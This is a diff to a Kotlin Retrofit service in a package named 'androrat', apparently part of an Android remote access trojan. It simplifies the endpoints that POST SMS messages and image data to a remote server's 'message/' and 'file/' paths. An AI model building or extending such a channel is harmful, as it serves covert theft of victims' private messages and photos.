@@ -6,32 +6,24 @@ import com.chuckerteam.chucker.api.ChuckerInterceptor
 import com.google.gson.GsonBuilder
 import com.ierusalem.androrat.utility.Constants
 import okhttp3.OkHttpClient
+import okhttp3.RequestBody
 import okhttp3.ResponseBody
 import retrofit2.Response
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
 import retrofit2.http.Body
-import retrofit2.http.Headers
 import retrofit2.http.POST
 
 interface SenderService {
 
-    @Headers("Accept: application/json")
     @POST("message/")
     suspend fun postMessages(
         @Body smsModel: SMSModel
     ): Response<ResponseBody>
 
-    @Headers("Accept: application/json")
-    @POST("message/")
-    suspend fun postImages(
-        @Body imageModel: ImageModel
-    ): Response<ResponseBody>
-
-    @Headers("Accept: application/json")
     @POST("file/")
-    suspend fun postFiles(
-        @Body fileModel: FileModel
+    suspend fun postImage(
+        @Body body: RequestBody
     ): Response<ResponseBody>
 
 }
@@ -71,12 +63,4 @@ class RetrofitInstance(context: Context) {
 
 data class SMSModel(
     val message: String
-)
-
-data class ImageModel(
-    val image: String
-)
-
-data class FileModel(
-    val file: String
 )
